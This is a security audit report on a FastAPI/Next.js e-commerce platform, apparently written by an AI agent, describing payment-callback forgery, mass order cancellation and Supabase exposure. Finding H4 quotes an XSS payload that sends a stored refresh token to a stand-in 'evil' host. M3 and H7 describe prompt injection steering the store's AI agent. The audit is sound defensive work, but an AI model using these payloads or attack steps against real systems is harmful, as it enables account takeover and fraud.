# Softune security audit — November 2026

Scope: `saas-backend` (FastAPI, worker, migrations, Docker/Caddy) and
`saas-dashboard` (Next.js), read end to end with a focus on what an outsider,
a shopper, a malicious merchant or a prompt-injected AI could do. Storefront
templates and the landing site were **not** in scope (separate repos) but are
called out where backend findings depend on them.

Branch with fixes: `claude/gifted-allen-2lhlij` in both repos.

**Severity:** Critical = money or every tenant's data at risk, exploitable
now · High = one tenant's account/data/store, or platform revenue ·
Medium = needs another bug or insider · Low = hardening.

**Status:** FIXED (in this branch) · OPEN (needs code you should schedule) ·
DECIDE (product/ops decision) · VERIFY (can't be checked from the code).

## 2. Critical

### C1 — Payment callbacks trusted any genuine payment — FIXED
`app/api/public.py` (`sslcommerz_callback`, `bkash_callback`, `nagad_callback`).
Each callback asked the gateway "is this payment real?" but never "is it for
this order and this amount?":
- **SSLCommerz:** pay ৳10 for order A, then open
  `/public/site/{host}/orders/{B}/pay/sslcommerz/callback?val_id=<A's val_id>`
  → order B (৳50,000) marked paid.
- **bKash:** pay a cheap order on bKash's page, then send its unexecuted
  `paymentID` to an expensive order's callback.
- **Nagad:** `verify_payment` takes no merchant credentials, so a ৳1 payment to
  *any Nagad merchant in Bangladesh* marked any order paid.

Fix: the verified record must name this order (`tran_id` /
`merchantInvoiceNumber` / `orderId`), cover the full amount and currency; bKash
must present the `paymentID` we created for the order; Nagad must match the
store's merchant id. Missing fields fail closed. Amounts compared as integer
cents via `Decimal`.

### C2 — Unauthenticated mass order cancellation — FIXED
`_finalize_gateway_payment` set `status="cancelled"` whenever verification
failed. The callback URLs are public and order numbers are sequential
(`ORD-1001`, `ORD-1002`, …), so a loop over order numbers with a junk `val_id`
cancelled every pending order — including COD orders — of every store with a
gateway connected. A competitor could wipe a store's order book in seconds.
Fix: a failed check leaves the order `pending` (which also lets the customer
retry payment).

### C3 — Supabase auto-REST exposure — VERIFY
Supabase exposes every `public` table over PostgREST to the `anon` and
`authenticated` roles unless RLS is on. Migrations only enable RLS for tables
created after migration 046 (plus a project-side `ensure_rls` trigger that is
not in the repo). The original tables — `users` (password hashes, OTP hashes),
`tenants`, `orders`, `customers`, `payment_connections`,
`courier_connections`, `sites`, … — have no RLS statement in any migration.
The anon key is designed to be public, so treat it as known.

Check right now (Supabase SQL editor):

```sql
-- Tables reachable by anon/authenticated with RLS off. Must return 0 rows.
SELECT c.relname
FROM pg_class c JOIN pg_namespace n ON n.oid = c.relnamespace
WHERE n.nspname = 'public' AND c.relkind = 'r' AND NOT c.relrowsecurity
  AND (has_table_privilege('anon', c.oid, 'SELECT')
       OR has_table_privilege('authenticated', c.oid, 'SELECT'));
```

Permanent fix (new migration — the app connects as `postgres` and is
unaffected):

```sql
REVOKE ALL ON ALL TABLES    IN SCHEMA public FROM anon, authenticated;
REVOKE ALL ON ALL SEQUENCES IN SCHEMA public FROM anon, authenticated;
REVOKE ALL ON ALL FUNCTIONS IN SCHEMA public FROM anon, authenticated;
ALTER DEFAULT PRIVILEGES IN SCHEMA public REVOKE ALL ON TABLES    FROM anon, authenticated;
ALTER DEFAULT PRIVILEGES IN SCHEMA public REVOKE ALL ON SEQUENCES FROM anon, authenticated;
ALTER DEFAULT PRIVILEGES IN SCHEMA public REVOKE ALL ON FUNCTIONS FROM anon, authenticated;
-- and ENABLE ROW LEVEL SECURITY on every table as a second layer.
```

Also remove `SUPABASE_ANON_KEY` / `SUPABASE_SERVICE_ROLE_KEY` from the server
`.env` — the backend never uses them, and the service-role key bypasses
everything if the VM is compromised.

## 3. High

### H1 — Demo access could hand out a real (even superadmin) login — FIXED
`/public/demo-access` minted tokens for `settings.demo_user_email` with no
check on that account. The default (and `env.production.example`) value was
the founder's personal Gmail — the same address used for billing
notifications. If that ever resolved to a real or superadmin account, anyone
passing reCAPTCHA got it. Now the endpoint refuses unless the user is active,
not a superadmin, and on an active `plan='demo'` tenant.

### H2 — Invoice PDFs public, enumerable and cross-tenant — FIXED (+ cleanup)
`media.upload_invoice_pdf` stored `softune/_invoices/{invoice_number}.pdf`
with `overwrite=True`, `access_mode="public"`. Invoice numbers restart at
`INV-1001` for every tenant, so each new tenant's first invoice overwrote the
previous tenant's (their stored `pdf_url` then showed someone else's legal
name, TIN, phone, email), and anyone could download `INV-1001.pdf`,
`INV-1002.pdf`, … (the cloud name is in every image URL). Now:
`_invoices/{tenant_id}/{invoice_number}-{random}.pdf`.
**Cleanup:** delete the old files and regenerate existing invoices.

### H3 — Storefront takedown by name collision — FIXED
`_find_published_site` matched `custom_domain == host OR subdomain ==
first-label(host)` and called `scalar_one_or_none()`. A store with custom
domain `elarabd.store` plus any other store with subdomain `elarabd` →
`MultipleResultsFound` → HTTP 500 on every storefront request, checkout
included. A free trial with shop name "elarabd" was enough. Now an exact
custom-domain match wins and the query returns at most one row; the IP-block
middleware uses the same lookup.

### H4 — Stored XSS in the dashboard AI chat — FIXED
`components/ai-chat/ai-message-item.tsx` rendered the model's reply with
`dangerouslySetInnerHTML` without escaping. The model echoes shopper-typed
data (checkout names, notes, contact forms). A checkout name of
`<img src=x onerror=fetch('//evil/'+localStorage['softune.auth.refreshToken'])>`
ran when the merchant asked "summarize my orders" → 14-day refresh token
stolen → full takeover of that store and every linked account. Now escaped
before markdown; link URLs can't contain quotes or start with `//`.

### H5 — Token storage and refresh rotation — OPEN
Access and refresh tokens (and the linked accounts' refresh tokens) live in
`localStorage`, readable by any XSS. `/auth/refresh` returns a new refresh
token but the old one stays valid for 14 days, so a stolen one is silent and
permanent. Fix, in order:
1. Rotate on use: revoke the presented refresh `jti` in `/auth/refresh`; on
   reuse of a revoked one, revoke all of that user's tokens (same pattern
   `oauth_server.refresh_tokens` already uses). Allow a ~30s grace for
   parallel tabs.
2. Move the refresh token into an `HttpOnly; Secure; SameSite=Strict` cookie
   scoped to `Path=/auth` on the API domain; keep only the 30-minute access
   token in memory.
3. Add a full Content-Security-Policy to the dashboard (Report-Only first).

### H6 — Revalidate secret leaks to merchant domains — OPEN
`worker.handle_revalidate_site` POSTs the single platform-wide
`REVALIDATE_SECRET` to `https://{site.custom_domain}/api/revalidate`. A
merchant controls that domain's DNS and can point it at their own server to
read the header, then purge any store's cache at will. Fix: send
`HMAC-SHA256(REVALIDATE_SECRET, site_id)` instead and have the storefront
template verify that per-site value; rotate the secret after shipping.

### H7 — Storefront HTML is never sanitized — OPEN
Product descriptions are rich HTML; about/legal pages and blocks carry
strings. Nothing on the backend sanitizes them, and they are written not only
by the merchant but by the ChatGPT connector (MCP) and the AI agent — both
can be steered by prompt injection. If the templates render this HTML
(check `dangerouslySetInnerHTML` in each template), a script on a storefront
can skim checkout data (names, phones, addresses). Fix: sanitize on write
with an allowlist (`nh3` in Python) in `blocks.validate_blocks()` and the
product/page write paths, and render through DOMPurify in the templates.
Longer term, serve storefronts from a separate registrable domain (Shopify
uses `myshopify.com`) and add it to the Public Suffix List; today every store
is same-site with `dashboard.softunebd.com`.

### H8 — Headless browser SSRF in the worker — OPEN
The worker runs Playwright 1.49 (an old Chromium) on storefront pages after
every publish, and on invoice HTML. Combined with H7, a storefront page can
`<iframe>` `http://rabbitmq:15672`, `http://api:8000`, or the cloud metadata
service `169.254.169.254`; the screenshot then shows it to the merchant.
Fix: `page.route("**/*", ...)` aborting private, loopback and link-local
destinations (resolve DNS first); upgrade Playwright; run the screenshotter
in its own container with no access to the compose network; block metadata
egress at the VM firewall.

### H9 — Platform billing SMS can be spoofed — DECIDE
`/public/webhooks/bkash-sms` auto-activates a plan or credit pack when an
SMS with matching `TrxID` and amount arrives on the phone. The merchant
chooses the TrxID in their claim, and the phone number receiving the SMS is
shown on the Billing page. Anyone who can get an SMS reading
`You have received Tk 999.00 ... TrxID ABC123XYZ` onto that phone (sender-ID
spoofing via international SMS routes is cheap) gets a paid plan for free —
unless the forwarder strictly filters on bKash's sender. Options, best first:
move platform billing to bKash/SSLCommerz merchant checkout (server-verified,
like the storefront gateways); or forward the sender and require it,
validate the exact bKash format (TrxID shape `^[A-Z0-9]{10}$`, balance line),
and auto-approve only up to a small amount, routing the rest to a human.

### H10 — No role-based access control — OPEN
`Principal.is_admin` exists but `AdminUser` is used nowhere; every route
accepts any logged-in user. A `member` (superadmins can create them) can
connect payment gateways — redirecting the store's money — change the manual
payout number, delete sites, and export every customer. Use `AdminUser` on
payments, courier, domains, site delete, billing, data export, and the
OAuth connect flow (that one already checks).

### H11 — IP blocklist bypass — FIXED
`ip_block` used `X-Original-Client-IP` *instead of* the client IP when
present; a blocked visitor just sent that header with any other address. Both
are now checked.

## 4. Medium

- **M1 Redis is security state.** Token revocation, login/OTP rate limits and
  trial-signup state live in a Redis configured with
  `maxmemory-policy allkeys-lru` (entries can be evicted) and all checks fail
  open on error. Use a separate Redis (or DB index) with `noeviction` for
  security keys, `requirepass`, and fail **closed** for login/OTP limits;
  alert on Redis errors.
- **M2 OAuth consent phishing.** Any ChatGPT user can create a connector
  (redirect still `chatgpt.com/connector/oauth/...`) and send a merchant the
  `/oauth/authorize` link; the consent page always says "ChatGPT". Require the
  flow to be started from the dashboard (nonce bound to the session), show the
  connector id and creation time, and email the owner on every new
  connection. Clickjacking of that page is now blocked (M15).
- **M3 AI agent prompt injection.** The agent applies writes immediately and
  reads attacker-controlled text (order notes, inquiries, customer names).
  Wrap tool results as untrusted data in the prompt, require a confirm card
  for price/stock/discount/order changes, and cap writes per message.
- **M4 Unsafe defaults.** `app_env` defaults to `development` (exposes `/docs`,
  returns raw exception text) and `debug` to `True`. Startup now logs
  `SECURITY:` lines for missing reCAPTCHA/credential/revalidate secrets and
  `env.production.example` lists them. Next: make the defaults
  `production`/`False` and require `.env` to opt into dev.
- **M5 OTP brute force.** Each new reset OTP resets the 5-attempt counter; at
  the 4-per-10-min email limit that is ~2,900 guesses/day/account (~0.3% per
  day). Add a daily per-account cap and lockout + email. Attempt counters are
  read-then-write (concurrent guesses exceed 5): use `UPDATE ... SET attempts
  = attempts + 1 ... RETURNING`.
- **M6 Enumeration.** `/auth/login` skips bcrypt for unknown emails (timing
  tells you which emails exist); `/trial/start` returns 409 for registered
  emails. Verify against a dummy hash; make signup respond identically.
- **M7 Token handoff in URL hash.** Any dashboard URL with
  `#softune_at=…&softune_rt=…` silently logs the browser in — an attacker can
  log a merchant into the attacker's account (they then type real gateway
  credentials into it). Replace with a one-time code exchanged by POST.
- **M8 Input bounds.** Body size now capped at Caddy (110MB). Still add:
  `max_length` + `https:`/`data:image/` check on `avatar_url`; caps on
  `PublicOrderCreate.customer` (keys/size) and `items` (e.g. 50); MCP
  JSON-RPC batch length.
- **M9 Trusted devices** aren't removed on password reset/change; a thief's
  device stays trusted for 30 days. Delete them in both flows.
- **M10 Database.** The API connects as `postgres` — any injection or bug has
  full power. Create an app role with only DML on app tables. asyncpg's
  default TLS doesn't verify the certificate; pass an `ssl` context with the
  Supabase CA (`verify-full`).
- **M11 Dependencies and CI.** Neither repo has CI. Older pins with published
  advisories in their lines (verify with the tools below): Playwright 1.49.1
  (Chromium renders untrusted pages), FastAPI 0.115.6 → Starlette 0.41.x,
  uvicorn 0.34.0 → h11, cryptography 43.0.3. Add GitHub Actions running
  `pip-audit`, `bandit`, `gitleaks`, `npm audit --omit=dev`, and enable
  Dependabot + secret scanning on both repos.
- **M12 Reserved subdomains.** `/trial/complete` slugifies the shop name
  without `RESERVED_SUBDOMAINS`, so shops named "admin", "api", "support",
  "dashboard" get those subdomains. Apply the list there and extend it with
  brand/phishing terms (`softune*`, `bkash`, `nagad`, `pay`, `secure`,
  `login`, `account`, `shop`, `store`, `superadmin`).
- **M13 Superadmin.** Superadmin is a JWT claim valid for 30 min after
  removal unless tokens are revoked; protected only by password + email OTP.
  Require TOTP for superadmins, revoke tokens when the flag is removed, and
  restrict `/superadmin/*` by IP/VPN at Caddy.
- **M14 Trial abuse.** Unlimited trials with fresh emails each get free AI
  image generations (real Gemini cost). Block disposable email domains, add
  phone OTP for trial start, cap trials per IP/device.
- **M15 Clickjacking — FIXED.** Dashboard now sends `frame-ancestors 'self'`,
  `X-Frame-Options`, HSTS, nosniff, Referrer-Policy, Permissions-Policy.

## 6. Beating local competitors on trust (roadmap)

Most Bangladeshi store builders compete on price and templates; security is
something you can sell. After the fixes above:

1. **Merchant 2FA with authenticator apps / passkeys**, not only email OTP.
2. **Login & activity log for merchants** (new device, password change, new
   ChatGPT connection, gateway credential change) with email alerts — you
   already have `admin_audit_logs` for superadmins; mirror it per tenant.
3. **Payment integrity statement**: "every online payment is verified
   server-to-server against the order and amount" — true as of C1.
4. **Status page and uptime SLA**, plus daily off-site backups with tested
   restores (Supabase PITR + weekly `pg_dump` to separate storage).
5. **Data export and deletion on request** for merchants and their shoppers.
6. **Published Security page + `security@softunebd.com`** for responsible
   disclosure (see `SECURITY_POLICY.md`).
7. **Storefronts on a separate domain** with automatic HTTPS and a strict CSP.

## 7. How fixes were verified

- Backend: byte-compiled; imported with production settings in an isolated
  venv; unit checks for the amount/reference matcher (other order, underpaid,
  missing fields, wrong currency all rejected), redirect host restriction,
  "failed check never cancels", and the generated SQL for the site lookup
  (single row, exact custom domain first) and IP-block subquery.
- Dashboard: the escaped markdown renderer was run against attack strings
  (`<img onerror>`, quote break-out in link URLs, `//evil.com`) — all inert,
  normal markdown unchanged.
- Not run: the `pytest` suite (it needs the real Supabase database) and the
  dashboard type-check/build (no `node_modules` here). Run both before merging.
